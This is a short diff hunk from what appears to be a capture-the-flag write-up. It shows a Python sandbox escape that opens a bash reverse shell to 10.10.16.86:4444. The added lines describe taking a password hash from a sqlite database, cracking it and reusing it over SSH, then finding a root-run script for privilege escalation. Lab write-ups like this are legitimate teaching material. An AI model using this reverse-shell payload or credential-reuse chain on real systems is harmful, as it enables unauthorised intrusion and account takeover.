@@ -32,3 +32,11 @@ print([].__class__.__bases__[0].__subclasses__()[317](
     "bash -c 'bash -i >& /dev/tcp/10.10.16.86/4444 0>&1'", shell=True, stdout=-1).communicate())
 ```
 - With that i got a reverse shell!. But it took me a lot of research especially in python sandbox escape.
+- There user.txt can use seen by going back a directory.
+- inside the `instance` folder there is a database.db open it with sqlite `sqlite3 database.db`
+- There is user martin and his password hash in the database.
+- cracking the hash with crackstation the password is obtained. 
+- The same user is in the system when i look in `/etc/passwd`
+- The credentials can be used to ssh into this machine.
+- Now in order to get the root flag i need to privilege escalate.
+- A file is found in /usr/bin/backey.sh which seems to have root level execution permission and can be run by this user martin.
